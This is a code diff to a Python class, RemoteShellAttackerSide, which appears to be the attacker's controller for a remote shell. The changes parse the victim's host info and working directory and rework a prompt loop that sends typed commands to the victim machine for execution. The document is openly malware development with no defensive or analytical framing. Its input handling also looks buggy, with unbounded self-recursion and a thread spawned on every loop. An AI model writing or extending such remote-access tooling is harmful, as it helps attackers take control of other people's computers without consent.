@@ -13,16 +13,17 @@ class RemoteShellAttackerSide:
         self.is_connected = False
         self.victim_info = ''
         self.victim_cwd = ''
+        self.is_displayed = True
 
     def main(self):
         self.__connect()
-
 
         while self.is_connected:
             try:
                 threading.Thread(target=self.__admin_input).start()
                 packet = HandelPacket.recv_packet(self.sock)
                 self.handle(packet)
+                self.is_displayed = True
             except Exception as e:
                 print(e)
                 self.is_connected = False
@@ -48,20 +49,26 @@ class RemoteShellAttackerSide:
 
         if packet.packet_type == PacketType.GENERAL.value:
             if packet.packet_sub_type == GeneralPacketType.ACK.value:
+                payload = packet.payload.decode().split(' ')
+                self.victim_info = payload[0]
+                self.victim_cwd = payload[1]
                 self.is_connected = True
 
     def __admin_input(self):
-        raw_command = input(f'{self.victim_info} {self.victim_cwd.split("/")[-1]} $ ')
+        if self.is_displayed:
+            raw_command = input(f'{self.victim_info} {self.victim_cwd.split("/")[-1]} $ ')
+            if raw_command != '':
+                command_components = raw_command.split(' ')
+                command = command_components[0]
+                command_args = command_components[1:]
 
-        command_components = raw_command.split(' ')
-        command = command_components[0]
-        command_args = command_components[1:]
-
-        if command in RemoteShellAttackerSide.commands.keys():
-            RemoteShellAttackerSide.commands[command](self, command_args)
-        else:
-            packet = RemoteShellPacket(RemoteShellPacketType.COMMAND, raw_command.encode())
-            SendPacket.send_packet(self.sock, packet)
+                if command in RemoteShellAttackerSide.commands.keys():
+                    RemoteShellAttackerSide.commands[command](self, command_args)
+                else:
+                    packet = RemoteShellPacket(RemoteShellPacketType.COMMAND, raw_command.encode())
+                    SendPacket.send_packet(self.sock, packet)
+                self.is_displayed = False
+            self.__admin_input()
 
     def __help(self, args: list = None):
         print('get some help')
